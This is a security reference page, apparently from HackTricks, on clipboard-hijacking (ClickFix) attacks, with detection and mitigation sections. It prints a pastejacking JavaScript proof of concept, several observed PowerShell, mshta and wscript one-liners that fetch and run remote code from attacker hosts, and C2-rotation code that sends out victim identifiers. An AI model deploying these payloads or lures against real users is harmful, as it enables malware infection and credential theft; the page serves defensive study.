# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não copiou você mesmo." – conselho antigo, mas ainda válido

## Visão Geral

Clipboard hijacking – also known as *pastejacking* – explora o fato de que os usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página web maliciosa (ou qualquer contexto com suporte a JavaScript, como uma aplicação Electron ou Desktop) coloca programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de social-engineering cuidadosamente elaboradas, a pressionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e de conteúdo web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware commodity, como NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, as mais novas dependem da assíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Fluxo ClickFix / ClearFake

1. O usuário visita um site typosquatted ou comprometido (por exemplo `docusign.sa[.]com`)
2. JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente um comando PowerShell de uma linha codificado em Base64 na área de transferência.
3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo e uma DLL maliciosa (classic DLL sideloading).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistence (por exemplo, scheduled task) – acabando por executar NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de cadeia NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) procura em seu diretório por `msvcp140.dll`.
* A DLL maliciosa resolve dinamicamente APIs com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, descriptografa-os usando uma chave XOR rotativa `"https://google.com/"`, injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Faz download de `la.txt` com **curl.exe**
2. Executa o JScript downloader dentro de **cscript.exe**
3. Busca um payload MSI → grava `libcef.dll` ao lado de uma aplicação assinada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** lança um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` através de `extrac32` e concatenação de arquivos e, finalmente, executa um script `.a3x` que exfiltra credenciais do navegador para `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algumas campanhas ClickFix pulam downloads de arquivos completamente e instruem as vítimas a colar um one‑liner que busca e executa JavaScript via WSH, o mantém persistente e rotaciona o C2 diariamente. Exemplo de cadeia observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principais características
- URL ofuscada invertida em tempo de execução para burlar inspeção casual.
- JavaScript persiste via um Startup LNK (WScript/CScript) e seleciona o C2 pelo dia atual – permitindo rápida rotação de domínios.

Fragmento JS mínimo usado para rotacionar C2s por data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa geralmente implanta um loader que estabelece persistência e puxa um RAT (por exemplo, PureHVNC), frequentemente fixando TLS a um certificado hardcoded e fragmentando o tráfego.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Endurecimento do navegador – desabilitar acesso de gravação à área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir gesto do usuário.
2. Conscientização de segurança – ensinar usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrários.
4. Controles de rede – bloquear outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
